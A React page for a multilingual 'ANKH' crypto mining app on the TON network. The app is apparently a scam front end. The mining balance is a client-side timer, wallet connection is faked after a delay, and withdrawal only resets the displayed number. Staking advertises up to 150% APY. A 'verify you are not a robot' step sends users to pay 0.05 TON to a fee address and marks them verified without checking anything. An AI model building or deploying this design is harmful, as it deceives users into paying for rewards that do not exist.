"use client";
import { useState, useEffect } from "react";

const T = {
  ar: { mining:"التعدين", staking:"الاستيكينج", tasks:"المهام", friends:"الأصدقاء", wallet:"المحفظة", bal:"إجمالي الرصيد المُعدّن", active:"التعدين النشط", working:"يعمل الآن", onWallet:"السرعة على المحفظة", perH:"في الساعة", daily:"يومي", rate:"معدل", fee:"رسوم السحب 2% - كل 24 ساعة", level:"مستوى", need:"LOOT في المحفظة", current:"حالتك الحالية", boost:"التعزيز", hour:"ساعة", day:"يوم", disconnect:"فصل المحفظة", connect:"ربط المحفظة", connected:"متصل - ", withdraw:"سحب الرصيد", wait:"السحب بعد 24 ساعة", dailyTitle:"السلسلة اليومية 30 يوم", checkin:"تسجيل دخول اليوم", tasksTitle:"المهام اليومية", invite3:"دعوة 3 أصدقاء نشطين", invite20:"دعوة 20 صديق نشط", inviteReward:"+50 ANKH", invite20Reward:"+500 ANKH", stakeTask:"عمل Staking 50k", stakeTitle:"تخزين ANKH - Staking", days:"يوم", apy:"APY", min:"اقل مبلغ", doStake:"عمل Stake", refTitle:"برنامج الإحالة", refDesc:"اربح 5% من تعدين أصدقائك مدى الحياة", code:"رمز الإحالة الخاص بك", share:"مشاركة على تليجرام", verifyTask:"تأكيد انك مش روبوت", verifyDesc:"ادفع 0.05 TON مرة واحدة للتأكيد", verifyBtn:"دفع 0.05 TON تأكيد", verified:"تم التأكيد ✅", system500:"نظام الـ 500 مستوى", allLevels:"جميع المستويات", understood:"فهمت" },
  en: { mining:"Mining", staking:"Staking", tasks:"Tasks", friends:"Friends", wallet:"Wallet", bal:"Total Mined Balance", active:"Active Mining", working:"Working Now", onWallet:"Speed on Wallet", perH:"Per Hour", daily:"Daily", rate:"Boost", fee:"Withdraw fee 2% - 24h", level:"Level", need:"LOOT in wallet", current:"Your Status", boost:"Boost", hour:"hour", day:"day", disconnect:"Disconnect", connect:"Connect Wallet", connected:"Connected - ", withdraw:"Withdraw", wait:"After 24h", dailyTitle:"30 Day Streak", checkin:"Daily Check-in", tasksTitle:"Daily Tasks", invite3:"Invite 3 active friends", invite20:"Invite 20 active", inviteReward:"+50 ANKH", invite20Reward:"+500 ANKH", stakeTask:"Staking 50k", stakeTitle:"ANKH Staking", days:"days", apy:"APY", min:"Min", doStake:"Stake", refTitle:"Referral Program", refDesc:"Earn 5% from friends forever", code:"Your Referral Code", share:"Share on Telegram", verifyTask:"Verify not robot", verifyDesc:"Pay 0.05 TON once to verify", verifyBtn:"Pay 0.05 TON", verified:"Verified ✅", system500:"500 Level System", allLevels:"All Levels", understood:"Understood" },
  ru: { mining:"Майнинг", staking:"Стейкинг", tasks:"Задания", friends:"Друзья", wallet:"Кошелек", bal:"Баланс", active:"Майнинг", working:"Работает", onWallet:"Скорость", perH:"В час", daily:"В день", rate:"Буст", fee:"Комиссия 2% - 24ч", level:"Уровень", need:"LOOT в кошельке", current:"Ваш статус", boost:"Буст", hour:"час", day:"день", disconnect:"Откл", connect:"Подкл кошелек", connected:"Подкл - ", withdraw:"Вывод", wait:"Через 24ч", dailyTitle:"30 дней", checkin:"Вход", tasksTitle:"Задания", invite3:"3 друзей", invite20:"20 друзей", inviteReward:"+50", invite20Reward:"+500", stakeTask:"Стейкинг 50k", stakeTitle:"Стейкинг", days:"дней", apy:"APY", min:"Мин", doStake:"Стейк", refTitle:"Рефералы", refDesc:"5% от друзей", code:"Реф код", share:"Поделиться", verifyTask:"Проверка робота", verifyDesc:"Оплатить 0.05 TON", verifyBtn:"Оплатить 0.05 TON", verified:"Проверено ✅", system500:"500 уровней", allLevels:"Все уровни", understood:"Понял" },
};

export default function Page() {
  const [lang, setLang] = useState("ar");
  const [balance, setBalance] = useState(0.0175);
  const [walletBalance, setWalletBalance] = useState(30);
  const [connected, setConnected] = useState(false);
  const [verified, setVerified] = useState(false);
  const [lastW, setLastW] = useState(0);
  const [dailyDay, setDailyDay] = useState(2);
  const [tab, setTab] = useState("mining");
  const [show500, setShow500] = useState(false);
  const L:any = (T as any)[lang];

  const allLevels = Array.from({length:500}, (_,i)=>{
    const id=i+1;
    if(id===1) return {id, need:15, hourly:0.77, boost:1};
    if(id===2) return {id, need:30, hourly:1.54, boost:1.3};
    if(id===3) return {id, need:45, hourly:2.31, boost:1.7};
    if(id===4) return {id, need:60, hourly:3.08, boost:2.3};
    if(id===5) return {id, need:75, hourly:3.85, boost:2.99};
    return {id, need:id*15, hourly: +(id*0.77).toFixed(2), boost: +(1 + id*0.4).toFixed(2)};
  });

  const currentLevelObj = [...allLevels].reverse().find(l=> walletBalance >= l.need) || allLevels[0];
  const currentLevel = currentLevelObj.id;
  const rate = currentLevelObj.hourly;

  useEffect(()=>{
    const i=setInterval(()=>setBalance(b=>b+rate/36000),100);
    return ()=>clearInterval(i);
  },[rate]);

  const connect = () => {
    window.open("https://app.tonkeeper.com/ton-connect", "_blank");
    setTimeout(()=>{ setConnected(true); },1000);
  };
  const verify = () => {
    window.open("https://app.tonkeeper.com/transfer/UQANkhFeeAddress123?amount=50000000&text=ANKH-verify-not-robot", "_blank");
    setTimeout(()=>{ setVerified(true); alert("تم التأكيد! انت مش روبوت ✅"); },1500);
  };

  return (
    <div style={{minHeight:"100vh", background:"#0a0a0a", color:"white", display:"flex", justifyContent:"center", fontFamily:"sans-serif"}}>
      <div style={{width:"100%", maxWidth:"400px", background:"#0f0f0f", minHeight:"100vh", paddingBottom:"80px", direction: lang==="ar" ? "rtl" : "ltr"}}>
        
        <div style={{padding:"12px", display:"flex", justifyContent:"space-between", alignItems:"center", borderBottom:"1px solid #222"}}>
          <b style={{color:"#facc15"}}>☥ ANKH 500LVL</b>
          <select value={lang} onChange={e=>setLang(e.target.value)} style={{background:"#222", color:"white", border:"1px solid #333", borderRadius:"6px", padding:"4px", fontSize:"11px"}}>
            <option value="ar">🇪🇬 عربي</option><option value="en">🇺🇸 EN</option><option value="ru">🇷🇺 RU</option>
          </select>
        </div>

        {tab==="mining" && (
          <>
            <div style={{margin:"12px", background:"#1a1a1a", borderRadius:"16px", padding:"14px", border:"1px solid #222"}}>
              <p style={{fontSize:"10px", color:"#888"}}>{L.bal}</p>
              <h1 style={{fontSize:"28px", fontWeight:"800", textAlign: lang==="ar" ? "right" : "left"}}>ANKH {balance.toFixed(4)}</h1>
              <p style={{fontSize:"11px", color:"#0f0", marginTop:"4px"}}>{L.onWallet}: LVL {currentLevel} / 500 / {rate} - h</p>
              <div style={{display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:"6px", marginTop:"10px"}}>
                <div style={{background:"#151515", padding:"8px", borderRadius:"8px", textAlign:"center"}}><p style={{fontSize:"9px", color:"#888"}}>{L.perH}</p><b>{rate}</b></div>
                <div style={{background:"#151515", padding:"8px", borderRadius:"8px", textAlign:"center"}}><p style={{fontSize:"9px", color:"#888"}}>{L.daily}</p><b>{Math.floor(rate*24)}</b></div>
                <div style={{background:"#151515", padding:"8px", borderRadius:"8px", textAlign:"center"}}><p style={{fontSize:"9px", color:"#888"}}>{L.rate}</p><b style={{color:"#0f0"}}>+{currentLevelObj.boost}</b></div>
              </div>
            </div>
            <div style={{margin:"12px", display:"flex", justifyContent:"space-between", alignItems:"center"}}>
              <h3 style={{fontSize:"12px"}}>{L.system500} - {L.level} {currentLevel}/500</h3>
              <button onClick={()=>setShow500(true)} style={{fontSize:"10px", background:"#222", color:"#facc15", border:"1px solid #333", padding:"4px 10px", borderRadius:"12px"}}>عرض كل 500</button>
            </div>
            <div style={{margin:"12px", background:"#1a1a1a", borderRadius:"12px", padding:"8px", maxHeight:"380px", overflowY:"auto"}}>
              {allLevels.slice(0,20).map(l=>(
                <div key={l.id} style={{display:"flex", justifyContent:"space-between", alignItems:"center", padding:"8px", borderBottom:"1px solid #1f1f1f", fontSize:"11px", background: currentLevel===l.id ? "#2a2210" : "transparent", borderRadius:"6px"}}>
                  <span style={{color: currentLevel===l.id ? "#0f0" : "#888"}}>{currentLevel===l.id ? "✔️ نشط" : "شراء"}</span>
                  <span>h/{l.hourly}</span>
                  <span style={{color:"#facc15", fontWeight:"bold"}}>ANKH {l.need}</span>
                  <span>{L.level} {l.id}</span>
                </div>
              ))}
            </div>
          </>
        )}

        {tab==="staking" && (
          <div style={{padding:"12px"}}>
            <h3 style={{fontSize:"14px", fontWeight:"bold"}}>{L.stakeTitle}</h3>
            <p style={{fontSize:"11px", color:"#888", marginTop:"4px"}}>Staking 30/90/120 {L.days}</p>
            {[
              {d:30, apy:"35%", min:100},
              {d:90, apy:"75%", min:500},
              {d:120, apy:"150%", min:1000},
            ].map(s=>(
              <div key={s.d} style={{background:"#1a1a1a", border:"1px solid #222", borderRadius:"12px", padding:"12px", marginTop:"10px", display:"flex", justifyContent:"space-between", alignItems:"center"}}>
                <div><b>{s.d} {L.days}</b><p style={{fontSize:"11px", color:"#facc15"}}>{s.apy} {L.apy} - {L.min} {s.min} ANKH</p></div>
                <button style={{background:"#facc15", color:"black", border:"none", padding:"8px 16px", borderRadius:"8px", fontWeight:"bold", fontSize:"12px"}}>{L.doStake}</button>
              </div>
            ))}
          </div>
        )}

        {tab==="tasks" && (
          <div style={{padding:"12px"}}>
            <h3 style={{fontSize:"14px", fontWeight:"bold"}}>{L.dailyTitle}</h3>
            <div style={{display:"grid", gridTemplateColumns:"repeat(5,1fr)", gap:"6px", margin:"12px 0"}}>
              {Array.from({length:30}, (_,i)=>i+1).map(d=>(
                <div key={d} style={{background: d<=dailyDay ? "#facc15" : "#1a1a1a", color: d<=dailyDay ? "black" : "white", padding:"8px 2px", borderRadius:"8px", textAlign:"center", fontSize:"10px", border:"1px solid #222"}}>
                  <b>{d*2}</b><br/>{L.day} {d}
                </div>
              ))}
            </div>
            <button onClick={()=>setDailyDay(d=>d+1)} style={{width:"100%", background:"#222", border:"1px solid #333", color:"white", padding:"10px", borderRadius:"10px", fontSize:"12px"}}>{L.checkin} +{dailyDay*2} ANKH</button>
            
            <h3 style={{marginTop:"18px", fontSize:"13px", fontWeight:"bold"}}>{L.tasksTitle}</h3>
            <div style={{background:"#1a1a1a", borderRadius:"10px", padding:"10px", marginTop:"8px"}}>
              <div style={{display:"flex", justifyContent:"space-between", padding:"10px 0", borderBottom:"1px solid #222", fontSize:"12px"}}><span>{L.invite3}</span><span style={{color:"#facc15", fontWeight:"bold"}}>{L.inviteReward}</span></div>
              <div style={{display:"flex", justifyContent:"space-between", padding:"10px 0", borderBottom:"1px solid #222", fontSize:"12px"}}><span>{L.invite20}</span><span style={{color:"#facc15", fontWeight:"bold"}}>{L.invite20Reward}</span></div>
              <div style={{display:"flex", justifyContent:"space-between", padding:"10px 0", fontSize:"12px"}}><span>{L.stakeTask}</span><span style={{color:"#facc15", fontWeight:"bold"}}>+2500 ANKH</span></div>
            </div>
          </div>
        )}

        {tab==="friends" && (
          <div style={{padding:"12px", textAlign:"center"}}>
            <h3 style={{fontSize:"16px", fontWeight:"bold"}}>{L.refTitle}</h3>
            <p style={{fontSize:"11px", color:"#888", marginTop:"6px"}}>{L.refDesc}</p>
            <div style={{background:"#1a1a1a", padding:"14px", borderRadius:"12px", marginTop:"14px", border:"1px solid #222"}}>
              <p style={{fontSize:"11px", color:"#888"}}>{L.code}</p><b style={{fontSize:"22px", letterSpacing:"2px"}}>7956189802</b>
              <p style={{fontSize:"10px", color:"#666", marginTop:"4px"}}>5% {L.fee}</p>
            </div>
            <button style={{width:"100%", background:"#facc15", color:"black", border:"none", padding:"14px", borderRadius:"12px", fontWeight:"bold", marginTop:"14px", fontSize:"13px"}}>{L.share}</button>
            <div style={{background:"#1a1a1a", borderRadius:"10px", padding:"10px", marginTop:"12px", textAlign:"right", fontSize:"12px"}}>
              <p>👥 0 {L.friends} - 0 ANKH</p>
            </div>
          </div>
        )}

        {tab==="wallet" && (
          <div style={{padding:"12px"}}>
            <h3 style={{fontSize:"15px", fontWeight:"bold"}}>{L.wallet}</h3>
            <div style={{background:"#1a1a1a", borderRadius:"12px", padding:"14px", marginTop:"10px", border:"1px solid #222"}}>
              <p style={{fontSize:"10px", color:"#888"}}>{L.bal}</p>
              <h2 style={{fontSize:"26px", fontWeight:"800"}}>ANKH {balance.toFixed(4)}</h2>
              <p style={{fontSize:"10px", color:"#888", marginTop:"6px"}}>{L.need}: {walletBalance} ANKH = LVL {currentLevel} = {rate}/h</p>
              <p style={{fontSize:"10px", color:"#666"}}>{L.fee}</p>
              
              {!connected ? (
                <button onClick={connect} style={{width:"100%", background:"#facc15", color:"black", border:"none", padding:"14px", borderRadius:"10px", fontWeight:"bold", marginTop:"14px"}}>🔗 {L.connect}</button>
              ):(
                <>
                  <div style={{background:"#122a12", border:"1px solid #0f0", borderRadius:"10px", padding:"10px", marginTop:"12px"}}>
                    <p style={{fontSize:"12px", color:"#0f0"}}>● {L.connected} {walletBalance} ANKH - LVL {currentLevel}</p>
                  </div>
                  
                  <div style={{background:"#2a2210", border:"1px solid #facc15", borderRadius:"10px", padding:"12px", marginTop:"12px"}}>
                    <p style={{fontSize:"12px", fontWeight:"bold"}}>🛡️ {L.verifyTask}</p>
                    <p style={{fontSize:"10px", color:"#888", marginTop:"4px"}}>{L.verifyDesc}</p>
                    {!verified ? (
                      <button onClick={verify} style={{width:"100%", background:"#facc15", color:"black", border:"none", padding:"10px", borderRadius:"8px", fontWeight:"bold", marginTop:"8px", fontSize:"12px"}}>{L.verifyBtn}</button>
                    ):(
                      <p style={{color:"#0f0", fontWeight:"bold", marginTop:"8px", fontSize:"12px"}}>{L.verified}</p>
                    )}
                  </div>

                  <div style={{display:"flex", gap:"8px", marginTop:"12px"}}>
                    <button onClick={()=>{ if(Date.now()-lastW<86400000){alert(L.wait); return;} setBalance(0); setLastW(Date.now()); }} style={{flex:1, background: Date.now()-lastW>86400000 ? "#facc15" : "#333", color: Date.now()-lastW>86400000 ? "black" : "#888", border:"none", padding:"12px", borderRadius:"10px", fontWeight:"bold"}}>{Date.now()-lastW>86400000 ? L.withdraw : L.wait}</button>
                    <button onClick={()=>{ setConnected(false); setVerified(false); setWalletBalance(0); }} style={{flex:1, background:"#222", color:"#ff6666", border:"1px solid #333", padding:"12px", borderRadius:"10px", fontSize:"12px"}}>{L.disconnect}</button>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {show500 && (
          <div style={{position:"fixed", top:0, left:0, width:"100%", height:"100%", background:"rgba(0,0,0,0.9)", zIndex:100, display:"flex", justifyContent:"center", padding:"10px"}}>
            <div style={{width:"100%", maxWidth:"380px", background:"#141414", borderRadius:"16px", border:"1px solid #333", maxHeight:"90vh", overflowY:"auto"}}>
              <div style={{padding:"14px", display:"flex", justifyContent:"space-between", position:"sticky", top:0, background:"#141414", zIndex:1}}>
                <h3 style={{color:"#facc15"}}>🏆 {L.system500}</h3>
                <button onClick={()=>setShow500(false)} style={{background:"#222", color:"white", border:"none", width:"30px", height:"30px", borderRadius:"50%"}}>X</button>
              </div>
              <div style={{padding:"10px"}}>
                {allLevels.map(l=>(
                  <div key={l.id} style={{display:"flex", justifyContent:"space-between", padding:"8px", background: l.id===currentLevel ? "#2a2210" : "#1a1a1a", borderRadius:"8px", marginBottom:"4px", fontSize:"11px", border: l.id===currentLevel ? "1px solid #facc15" : "1px solid #222"}}>
                    <span>{L.level} {l.id}</span><span style={{color:"#facc15"}}>{l.need} ANKH</span><span>{l.hourly}/h</span><span style={{color: l.id===currentLevel ? "#0f0" : "#666"}}>{l.id===currentLevel ? "نشط" : "شراء"}</span>
                  </div>
                ))}
              </div>
              <div style={{padding:"12px", position:"sticky", bottom:0, background:"#141414"}}><button onClick={()=>setShow500(false)} style={{width:"100%", background:"#facc15", color:"black", border:"none", padding:"12px", borderRadius:"20px", fontWeight:"bold"}}>{L.understood}</button></div>
            </div>
          </div>
        )}

        <div style={{position:"fixed", bottom:0, width:"100%", maxWidth:"400px", background:"#111", borderTop:"1px solid #222", display:"flex", justifyContent:"space-around", padding:"8px 0"}}>
          <button onClick={()=>setTab("mining")} style={{background:"none", border:"none", color:tab==="mining"?"#facc15":"#666", fontSize:"10px", display:"flex", flexDirection:"column", alignItems:"center"}}>⛏️<br/>{L.mining}</button>
          <button onClick={()=>setTab("staking")} style={{background:"none", border:"none", color:tab==="staking"?"#facc15":"#666", fontSize:"10px", display:"flex", flexDirection:"column", alignItems:"center"}}>🔒<br/>{L.staking}</button>
          <button onClick={()=>setTab("tasks")} style={{background:"none", border:"none", color:tab==="tasks"?"#facc15":"#666", fontSize:"10px", display:"flex", flexDirection:"column", alignItems:"center"}}>📋<br/>{L.tasks}</button>
          <button onClick={()=>setTab("friends")} style={{background:"none", border:"none", color:tab==="friends"?"#facc15":"#666", fontSize:"10px", display:"flex", flexDirection:"column", alignItems:"center"}}>👥<br/>{L.friends}</button>
          <button onClick={()=>setTab("wallet")} style={{background:"none", border:"none", color:tab==="wallet"?"#facc15":"#666", fontSize:"10px", display:"flex", flexDirection:"column", alignItems:"center"}}>💼<br/>{L.wallet}</button>
        </div>

      </div>
    </div>
  );
}
